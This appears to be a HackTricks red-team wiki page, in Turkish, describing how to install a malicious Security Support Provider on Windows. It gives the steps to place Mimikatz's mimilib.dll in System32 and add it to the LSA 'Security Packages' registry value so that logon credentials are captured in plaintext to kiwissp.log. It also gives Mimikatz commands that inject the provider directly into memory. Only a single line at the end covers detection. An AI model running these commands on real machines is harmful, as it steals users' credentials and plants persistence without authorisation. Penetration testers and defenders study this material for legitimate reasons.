# Custom SSP

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Custom SSP

[SSP (Güvenlik Destek Sağlayıcısı) nedir burada öğrenin.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
Kendi **SSP'nizi** oluşturabilirsiniz, böylece makineye erişmek için kullanılan **kimlik bilgilerini** **düz metin** olarak **yakalayabilirsiniz**.

#### Mimilib

Mimikatz tarafından sağlanan `mimilib.dll` ikili dosyasını kullanabilirsiniz. **Bu, tüm kimlik bilgilerini düz metin olarak bir dosyaya kaydedecektir.**\
Dll dosyasını `C:\Windows\System32\` dizinine bırakın.\
Mevcut LSA Güvenlik Paketlerinin bir listesini alın:

{% code title="attacker@target" %}
```bash
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
{% endcode %}

`mimilib.dll` dosyasını Güvenlik Destek Sağlayıcıları listesine (Güvenlik Paketleri) ekleyin:
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
Ve bir yeniden başlatmadan sonra tüm kimlik bilgileri `C:\Windows\System32\kiwissp.log` dosyasında düz metin olarak bulunabilir.

#### Bellekte

Bunu doğrudan belleğe Mimikatz kullanarak da enjekte edebilirsiniz (biraz kararsız/çalışmayabileceğini unutmayın):
```powershell
privilege::debug
misc::memssp
```
Bu yeniden başlatmalara dayanmaz.

#### Hafifletme

Olay ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages` oluşturma/değiştirme denetimi

{% hint style="success" %}
AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
